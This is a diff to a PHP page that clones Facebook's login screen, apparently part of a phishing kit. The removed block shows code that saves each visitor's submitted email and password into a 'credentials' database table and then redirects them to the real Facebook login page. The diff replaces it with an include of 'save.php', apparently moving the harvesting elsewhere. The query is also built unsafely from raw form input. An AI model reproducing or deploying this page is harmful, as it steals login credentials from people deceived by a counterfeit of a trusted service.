@@ -1,22 +1,5 @@
 <?php
-/*$servername = "localhost";
-$username   = "root";
-$password   = "";
-$dbname     = "eypbi";
-
-if ($_POST) {
-    $conn     = new mysqli($servername, $username, $password, $dbname);
-    $email    = $_POST['email'];
-    $password = $_POST['pass'];
-    $sql      = "INSERT INTO credentials (email, password)
-                  VALUES ('$email', '$password')";
-    $conn->query($sql);
-    $conn->close();
-    header("Location: https://www.facebook.com/login.php?login_attempt=1&lwv=110");
-    die();
-}
-
-*/
+require_once('save.php');
 ?>
 <!DOCTYPE html>
 <!-- saved from url=(0020)http://fakebook.dev/ -->
@@ -1502,9 +1485,7 @@ if ($_POST) {
                         </td>
                         <td class="_51m- hLeft plm"><a
                                 href="http://l.facebook.com/l.php?u=http%3A%2F%2Fmomentsapp.com%2F&amp;h=wAQGsCzGC&amp;s=1"
-                                title="Check out Moments." target="_blank" rel="nofollow"
-                                onmouseover="LinkshimAsyncLink.swap(this, &quot;http:\/\/momentsapp.com\/&quot;);"
-                                onclick="LinkshimAsyncLink.referrer_log(this, &quot;http:\/\/momentsapp.com\/&quot;, &quot;\/si\/ajax\/l\/render_linkshim_log\/?u=http\u00253A\u00252F\u00252Fmomentsapp.com\u00252F&amp;h=wAQGsCzGC&amp;render_verification=0&amp;enc&amp;d&quot;);">Moments</a>
+                                title="Check out Moments." target="_blank" rel="nofollow">Moments</a>
                         </td>
                         <td class="_51m- hLeft plm"><a href="https://www.facebook.com/facebook" accesskey="8"
                                                        title="Read our blog, discover the resource center, and find job opportunities.">About</a>
